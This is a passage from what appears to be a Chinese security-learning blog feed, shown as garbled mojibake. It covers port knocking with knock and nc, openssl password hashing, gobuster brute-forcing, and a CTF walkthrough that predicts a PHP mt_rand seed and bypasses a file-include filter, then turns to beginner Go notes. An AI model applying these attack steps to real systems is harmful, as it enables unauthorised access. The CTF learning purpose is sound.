class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¡ºåºåœ¨<span class="regexp">/etc/</span>knockd.conf</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼Œ</p><p>æˆ‘å…³é—­äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22/sshç«¯å£</span><br></pre></td></tr></table></figure><p>æˆ‘å†™äº†ä¸€ä¸ªé¡ºåº</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">7893</span>,<span class="number">6452</span>,<span class="number">2412</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸‰ä¸ªç«¯å£</p><p>æˆ‘ä¸ºä»€ä¹ˆä¸ºä½ <code>æ‰“å¼€22ç«¯å£</code>ï¼ŒåŸå› æ˜¯å› ä¸ºä½ <code>æ•²å¯¹äº†é¡ºåº</code></p><p>è¿™é‡Œå°±æ¶‰åŠ<code>æ•²é—¨çš„æ–¹æ³•</code></p><h3 id="1-gt-knockå‘½ä»¤"><a href="#1-gt-knockå‘½ä»¤" class="headerlink" title="1&gt; knockå‘½ä»¤"></a>1&gt; knockå‘½ä»¤</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.1.8</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span> //<span class="number">192.168.1.8</span>ä¸ºç›®æ ‡ip</span><br></pre></td></tr></table></figure><h3 id="2-gt-ncå‘½ä»¤"><a href="#2-gt-ncå‘½ä»¤" class="headerlink" title="2&gt;ncå‘½ä»¤"></a>2&gt;ncå‘½ä»¤</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nc -v dc9 <span class="number">7469</span></span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">7469</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">8475</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">8475</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">9842</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">9842</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">ä¹Ÿå°±æ˜¯åˆ©ç”¨ncå‘½ä»¤ä¸‰æ¬¡è®¿é—®è¿™<span class="number">3</span>ä¸ªç«¯å£</span><br></pre></td></tr></table></figure><p>æœ€åç”¨<code>nmap</code>æ‰«ä¸€ä¸‹å°±çœ‹è§<code>22</code>ç«¯å£æ‰“å¼€äº†</p><h2 id="9-openssl"><a href="#9-openssl" class="headerlink" title="9)openssl"></a>9)openssl</h2><h3 id="SSL-ç®€ä»‹"><a href="#SSL-ç®€ä»‹" class="headerlink" title="SSL ç®€ä»‹"></a>SSL ç®€ä»‹</h3><blockquote><p>æŒ‰ç…§æˆ‘çš„ç†è§£æ¥è§£é‡Šä¸‹ï¼Œ</p><p>ä¸ºäº†è®©ç½‘ç»œé€šä¿¡æ›´å®‰å…¨ï¼Œéœ€è¦è®¤è¯å’ŒåŠ å¯†ï¼Œè®¤è¯æ˜¯è¯´æ˜ä½ æ˜¯è¦æ‰¾çš„äººï¼ŒåŠ å¯†æ˜¯ä¸ºäº†è®©æˆªè·ä¸­é—´æŠ¥æ–‡ç¬¬ä¸‰è€…æ— æ³•å¾—åˆ°æ¶ˆæ¯å†…å®¹ã€‚</p><p>ä¸ºæ­¤æœ‰äººè®¾è®¡äº†SSLï¼Œå³å¥—æ¥å­—ä¸Šçš„å®‰å…¨å±‚ï¼Œç®€å•æ¥è¯´å°±æ˜¯åœ¨TCPä¹‹ä¸Šåšä¸€ä¸ªå®‰å…¨é€šä¿¡å±‚ï¼ŒHTTP on SSL å³æ˜¯HTTPsï¼Œ</p><p>ç°åœ¨å‡ ä¹æ‰€æœ‰çš„é“¶è¡Œç½‘ç«™è®¿é—®éƒ½æ˜¯åŸºäºHTTPSåè®®çš„ã€‚<br>è®¤è¯æ˜¯é€šè¿‡è¯ä¹¦+éå¯¹ç§°åŠ å¯†ç®—æ³•æ¥è§£å†³çš„</p></blockquote><blockquote><p>opensslå¯ä»¥å®ç°ï¼šç§˜é’¥è¯ä¹¦ç®¡ç†ã€å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†ã€‚</p></blockquote><p>ä¸¾ä¸€ä¸ªä¾‹å­</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -<span class="number">1</span> -salt salt password</span><br><span class="line">==&gt;</span><br><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line">-<span class="number">1</span>ä½¿ç”¨ä»€ä¹ˆå“ˆå¸Œç®—æ³•ã€‚åœ¨æˆ‘ä»¬çš„ç”¨ä¾‹ä¸­ï¼Œè¿™æ— å…³ç´§è¦ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ MD5ï¼Œåœ¨ç°å®ä¸–ç•Œçš„ PT ä¸­åº”è¯¥é¿å…ä½¿ç”¨ MD5ï¼Œå› ä¸ºå®ƒä¸å®‰å…¨ã€‚</span><br><span class="line"></span><br><span class="line">-salt saltç”¨ä½œç›çš„å­—ç¬¦ä¸²ã€‚æˆ‘é€‰æ‹©å­—ç¬¦ä¸²ç›</span><br><span class="line"></span><br><span class="line">passwordæˆ‘ä»¬æƒ³ä½¿ç”¨çš„æ˜æ–‡å¯†ç </span><br></pre></td></tr></table></figure><h2 id="10-gobuster"><a href="#10-gobuster" class="headerlink" title="10)gobuster"></a>10)gobuster</h2><h3 id="çˆ†ç ´ç›®å½•"><a href="#çˆ†ç ´ç›®å½•" class="headerlink" title="çˆ†ç ´ç›®å½•"></a>çˆ†ç ´ç›®å½•</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gobuster</span> dir -w <span class="meta">common</span>.txt -u url</span><br></pre></td></tr></table></figure><h3 id="çˆ†ç ´å­åŸŸå"><a href="#çˆ†ç ´å­åŸŸå" class="headerlink" title="çˆ†ç ´å­åŸŸå"></a>çˆ†ç ´å­åŸŸå</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gobuster</span> vhost -w subdomains-top1million-<span class="number">5000</span>.txt -u url</span><br></pre></td></tr></table></figure><h2 id="11-seedå·¥å…·php-mt-seed"><a href="#11-seedå·¥å…·php-mt-seed" class="headerlink" title="11)seedå·¥å…·php_mt_seed"></a>11)seedå·¥å…·php_mt_seed</h2><p>è¿™é‡Œä»¥ä¸€é“é¢˜ä¸ºä¾‹å­è®²è§£è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; Hint: <span class="number">1219893521</span></span><br><span class="line">No Hacker!</span><br></pre></td></tr></table></figure><hr><p>æœç´¢è¿™ä¸¤ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_scrand</span>()</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>()  </span><br></pre></td></tr></table></figure><p><code>mt_scrand(seed)</code>è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘<code>seed</code>ç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé <code>mt_rand()</code>ç”Ÿæˆéšæœºæ•°ã€‚</p><p>æˆ‘ä»¬æ¥å†™æ®µä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è®¿é—®ï¼Œè¾“å‡º<code>162946439</code>ã€‚</p><p>ç°åœ¨ä»£ç æ”¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†æ¬¡è®¿é—®:</p><blockquote><p>162946439</p><p>247161732</p><p>1463094264</p><p>1878061366</p><p>394962642</p></blockquote><p>å‘ç°<code>162946439</code>åˆå‡ºç°äº†</p><blockquote><p>æ‰€ä»¥å¯ä»¥æ¨æ–­å‡ºéšæœºæ•°å…¶å®æ˜¯å¯é¢„æµ‹çš„ï¼Œ</p><p>å®ƒä»¥ä¸€ç§çº¿æ€§çš„æ–¹å¼ç”Ÿæˆ</p><p>çŸ¥é“ç§å­å’Œä¸€ç»„ä¼ªéšæœºæ•°ä¸æ˜¯å°±å¯ä»¥æ¨y(ä¼ªéšæœºæ•°äº†å—),å½“ç„¶å®é™…ä¸Šæ›´å¤æ‚è‚¯å®šã€‚</p><p>æˆ‘çŸ¥é“ç§å­åï¼Œå¯ä»¥ç¡®å®šä½ è¾“å‡ºä¼ªéšæœºæ•°çš„åºåˆ—ã€‚<br>çŸ¥é“ä½ çš„éšæœºæ•°åºåˆ—ï¼Œå¯ä»¥ç¡®å®šä½ çš„ç§å­ã€‚ </p></blockquote><p>åœ¨æˆ‘ä»¬çš„ä¾‹é¢˜ä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“æˆ‘ä»¬çš„ç§å­æ˜¯å¤šå°‘</p><p>ä½†æ˜¯å®ƒç»™å‡ºäº†æˆ‘ä»¬ç§å­çš„ç¬¬ä¸€ä¸ªéšæœºæ•°<code>1219893521</code></p><p>è¿™ä¸ªæ—¶å€™æƒ³è¦æ‹¿åˆ°ç§å­çš„å€¼ï¼Œå°±éœ€è¦å¤§é‡åå‘çš„æ¼”ç®—æ¨å¯¼äº†</p><p>è¿™ä¸ªè¿‡ç¨‹å¾ˆåºå¤§ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨åˆ°äº†å·¥å…·ã€è„šæœ¬ã€‘<code>php_mt_seed</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">time</span> ./php_mt_seed ç¬¬ä¸€ä¸ªéšæœºæ•°  </span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20221120141340099.png" alt="image-20221120141340099"></p><p>äºæ˜¯æˆ‘ä»¬å°±å¾—åˆ°äº†æˆ‘ä»¬çš„<code>seed</code></p><blockquote><p>1145146</p></blockquote><p>å†åˆ†ææºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨ echoå¤„å·²ç»éšæœºäº†ä¸€æ¬¡ï¼Œæ‰€ä»¥åœ¨åº•ä¸‹æ¯”è¾ƒçš„æ—¶å€™å°±ç®—ç¬¬äºŒä¸ªéšæœºæ•°è¿›è¡Œå¼ºç±»å‹æ¯”è¾ƒ</p><p>äºæ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="string">&quot;1145146&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line">==&gt;<span class="number">1219893521</span>&lt;br&gt;<span class="number">1202031004</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>guess</code>å‚æ•°çš„å€¼<code>1202031004</code></p><p>å¯¹äºæœ€åå¯¹<code>file</code>æ–‡ä»¶åŒ…å«è¯­å¥çš„æ­£åˆ™åŒ¹é…ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯ä¸èƒ½å‡ºç°<code>base</code>ï¼Œç„¶åå‚æ•°ä¸­é—´è¦åŒ…å«<code>/NewStar/</code>è¿™ä¸€æ®µ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter</span><br></pre></td></tr></table></figure><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang</title>
      <link href="/2022/12/23/Go/"/>
      <url>/2022/12/23/Go/</url>
      
        <content type="html"><![CDATA[<p><strong><code>goè¯­è¨€çœŸå¥½ç©(</code></strong></p><p><code>ä¸»è¦ä»é»„å“¥çš„èµ„æ–™ç¬”è®°ï¼Œå°šç¡…è°·ï¼Œä»¥åŠè°¢å…ˆæ–Œå¤§ä½¬çš„ç¬”è®°</code><strong><code>https://www.xiexianbin.cn/golang</code></strong></p><p><code>ä»¥åŠ</code><strong><a href="https://exercism.org/">https://exercism.org/</a></strong><code>ä¸Šé¢è¿›è¡Œç»ƒä¹ </code></p><span id="more"></span><h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="GOè¯­è¨€æ¦‚è¿°"><a href="#GOè¯­è¨€æ¦‚è¿°" class="headerlink" title="GOè¯­è¨€æ¦‚è¿°"></a>GOè¯­è¨€æ¦‚è¿°</h2><blockquote><p>Goè¯­è¨€æ˜¯è°·æ­Œ2009å¹´å‘å¸ƒçš„ç¬¬äºŒæ¬¾å¼€æºç¼–ç¨‹è¯­è¨€,å®ƒä¸“é—¨é’ˆå¯¹å¤šå¤„ç†å™¨ç³»ç»Ÿåº”ç”¨ç¨‹åºçš„ç¼–ç¨‹è¿›è¡Œäº†ä¼˜åŒ–ï¼Œå®ƒæ˜¯ä¸€ç§ç³»ç»Ÿè¯­è¨€å…¶éå¸¸æœ‰ç”¨å’Œå¼ºå¤§,å…¶ç¨‹åºå¯ä»¥åª²ç¾Cæˆ–C++ä»£ç çš„é€Ÿåº¦ï¼Œè€Œä¸”æ›´åŠ å®‰å…¨ã€æ”¯æŒå¹¶è¡Œè¿›ç¨‹ã€‚</p><p>Goæ”¯æŒé¢å‘å¯¹è±¡ï¼Œè€Œä¸”å…·æœ‰çœŸæ­£çš„é—­åŒ…(closures)å’Œåå°„ (reflection)ç­‰åŠŸèƒ½ã€‚</p><p>Goå¯ä»¥åœ¨ä¸æŸå¤±åº”ç”¨ç¨‹åºæ€§èƒ½çš„æƒ…å†µä¸‹é™ä½ä»£ç çš„å¤æ‚æ€§ã€‚</p><p>Goæ˜¯æ˜¯é™æ€å¼ºç±»å‹è¯­è¨€</p><p>Goè¯­è¨€å¼€å‘è€…è¢«å«åšgopherï¼Œè¿™ä¸ªå’Œä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿgopheråè®®åŒå</p></blockquote><h2 id="Goè¯­è¨€ç‰¹è‰²"><a href="#Goè¯­è¨€ç‰¹è‰²" class="headerlink" title="Goè¯­è¨€ç‰¹è‰²"></a>Goè¯­è¨€ç‰¹è‰²</h2><blockquote><ul><li>ç®€æ´ã€å¿«é€Ÿã€å®‰å…¨</li><li>å¹¶è¡Œã€æœ‰è¶£ã€å¼€æº</li><li>å†…å­˜ç®¡ç†ã€æ•°ç»„å®‰å…¨ã€ç¼–è¯‘è¿…é€Ÿ</li></ul></blockquote><h2 id="Goè¯­è¨€ç”¨é€”"><a href="#Goè¯­è¨€ç”¨é€”" class="headerlink" title="Goè¯­è¨€ç”¨é€”"></a>Goè¯­è¨€ç”¨é€”</h2><blockquote><p>Go è¯­è¨€è¢«è®¾è®¡æˆä¸€é—¨åº”ç”¨äºæ­è½½ Web æœåŠ¡å™¨ï¼Œå­˜å‚¨é›†ç¾¤æˆ–ç±»ä¼¼ç”¨é€”çš„å·¨å‹ä¸­å¤®æœåŠ¡å™¨çš„ç³»ç»Ÿç¼–ç¨‹<br>è¯­è¨€ã€‚å¯¹äºé«˜æ€§èƒ½åˆ†å¸ƒå¼ç³»ç»Ÿé¢†åŸŸè€Œè¨€ï¼ŒGo è¯­è¨€æ— ç–‘æ¯”å¤§å¤šæ•°å…¶å®ƒè¯­è¨€æœ‰ç€æ›´é«˜çš„å¼€å‘æ•ˆç‡ã€‚<br>å®ƒæä¾›äº†æµ·é‡å¹¶è¡Œçš„æ”¯æŒï¼Œè¿™å¯¹äºæ¸¸æˆæœåŠ¡ç«¯çš„å¼€å‘è€Œè¨€æ˜¯å†å¥½ä¸è¿‡äº†ã€‚</p></blockquote><h2 id="Goè¯­è¨€ç¼–è¯‘è¿‡ç¨‹"><a href="#Goè¯­è¨€ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="Goè¯­è¨€ç¼–è¯‘è¿‡ç¨‹"></a>Goè¯­è¨€ç¼–è¯‘è¿‡ç¨‹</h2><p><img src="/2022/12/23/Go/image-20230117215732032.png" alt="image-20230117215732032"></p><h2 id="å¯æŸ¥çœ‹æ–‡æ¡£ç½‘ç«™ä¿¡æ¯"><a href="#å¯æŸ¥çœ‹æ–‡æ¡£ç½‘ç«™ä¿¡æ¯" class="headerlink" title="å¯æŸ¥çœ‹æ–‡æ¡£ç½‘ç«™ä¿¡æ¯"></a>å¯æŸ¥çœ‹æ–‡æ¡£ç½‘ç«™ä¿¡æ¯</h2><blockquote><p>å®˜ç½‘:<br><a href="https://golang.google.cn/">https://golang.google.cn/</a><br>APIæ–‡æ¡£:<br><a href="https://golang.google.cn/doc/">https://golang.google.cn/doc/</a><br>æ•™ç¨‹:<br><a href="http://www.w3cschool.cn/go/go-tutorial.html">http://www.w3cschool.cn/go/go-tutorial.html</a><br>ä¸‹è½½:<br><a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p></blockquote><h2 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h2><p>åŸºç¡€æ¦‚å¿µå°†ä»‹ç»ä¸‰ç§ä¸»è¦çš„è¯­è¨€ç‰¹æ€§ï¼š<code>åŒ…ã€å‡½æ•°å’Œå˜é‡</code></p><h3 id="Package"><a href="#Package" class="headerlink" title="Package"></a>Package</h3><blockquote><p><code>Go</code> åº”ç”¨ç¨‹åºä»¥åŒ…çš„å½¢å¼ç»„ç»‡ã€‚åŒ…æ˜¯ä½äºåŒä¸€ç›®å½•ä¸­çš„æºæ–‡ä»¶çš„é›†åˆã€‚ç›®å½•ä¸­çš„æ‰€æœ‰æºæ–‡ä»¶å¿…é¡»å…±äº«ç›¸åŒçš„åŒ…åç§°ã€‚åŒ…åç§°é€šå¸¸æ˜¯å¯¼å…¥è·¯å¾„ä¸­çš„æœ€åä¸€ä¸ªç›®å½•ã€‚</p></blockquote><p>ä¾‹å¦‚ï¼Œ</p><p><a href="https://golang.org/src/math/rand/">â€œmath&#x2F;randâ€åŒ…</a>ä¸­çš„æ–‡ä»¶ä»¥è¯­å¥å¼€å¤´<code>package rand</code>ã€‚</p><blockquote><p>å¯¼å…¥åŒ…æ—¶ï¼Œåªèƒ½ä½¿ç”¨&#x2F;è®¿é—®åç§°ä»¥å¤§å†™å­—æ¯å¼€å¤´çš„å®ä½“ï¼ˆå‡½æ•°ã€ç±»å‹ã€å˜é‡ã€å¸¸é‡ï¼‰ã€‚Go ä¸­æ¨èçš„å‘½åé£æ ¼æ˜¯æ ‡è¯†ç¬¦å°†ä½¿ç”¨ å‘½å<code>camelCase</code>ï¼Œé™¤äº†é‚£äº›æ„å‘³ç€å¯ä»¥è·¨åŒ…è®¿é—®çš„æ ‡è¯†ç¬¦åº”è¯¥æ˜¯<code>PascalCase</code></p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> lasagna</span><br></pre></td></tr></table></figure><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p>Go æ˜¯é™æ€ç±»å‹çš„ï¼Œè¿™æ„å‘³ç€æ‰€æœ‰å˜é‡åœ¨ç¼–è¯‘æ—¶éƒ½<a href="https://en.wikipedia.org/wiki/Type_system">å¿…é¡»å…·æœ‰å®šä¹‰çš„ç±»å‹ã€‚</a></p><p>å¯ä»¥é€šè¿‡æ˜¾å¼æŒ‡å®šç±»å‹æ¥å®šä¹‰å˜é‡ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> explicit <span class="type">int</span> <span class="comment">// æ˜¾å¼å£°æ˜</span></span><br></pre></td></tr></table></figure><p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨åˆå§‹åŒ–å™¨ï¼Œç¼–è¯‘å™¨å°†åˆ†é…å˜é‡ç±»å‹ä»¥åŒ¹é…åˆå§‹åŒ–å™¨çš„ç±»å‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">implicit := <span class="number">10</span>   <span class="comment">// éšå¼å£°æ˜ä¸ºintï¼Œè‡ªåŠ¨åˆ†é…ç±»å‹</span></span><br><span class="line"><span class="comment">//ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åˆ©ç”¨ := è¿›è¡Œç±»å‹å£°æ˜ï¼Œå…¶ç±»å‹ä¸ºå…¶åæ•°æ®çš„ç±»å‹</span></span><br></pre></td></tr></table></figure><p>å£°æ˜åï¼Œå¯ä»¥ä½¿ç”¨è¿ç®—ç¬¦ä¸ºå˜é‡èµ‹å€¼<code>=</code>ã€‚ä¸€æ—¦å£°æ˜ï¼Œå˜é‡çš„ç±»å‹å°±æ°¸è¿œä¸ä¼šæ”¹å˜ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count := <span class="number">1</span> <span class="comment">// èµ‹åˆå€¼</span></span><br><span class="line">count = <span class="number">2</span>  <span class="comment">// æ›´æ–°æ–°å€¼</span></span><br><span class="line"></span><br><span class="line">count = <span class="literal">false</span> <span class="comment">// ç”±äºåˆ†é…äº†éâ€œintâ€ç±»å‹ï¼Œè¿™ä¼šå¼•å‘ç¼–è¯‘å™¨é”™è¯¯</span></span><br></pre></td></tr></table></figure><h3 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h3><p>å¸¸é‡å°±åƒå˜é‡ä¸€æ ·ä¿å­˜ä¸€æ®µæ•°æ®ï¼Œä½†å®ƒä»¬çš„å€¼åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ä¸èƒ½æ”¹å˜ã€‚</p><p>å¸¸é‡ä½¿ç”¨<code>const</code>å…³é”®å­—å®šä¹‰ï¼Œå¯ä»¥æ˜¯æ•°å­—ã€å­—ç¬¦ã€å­—ç¬¦ä¸²æˆ–å¸ƒå°”å€¼ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Age = 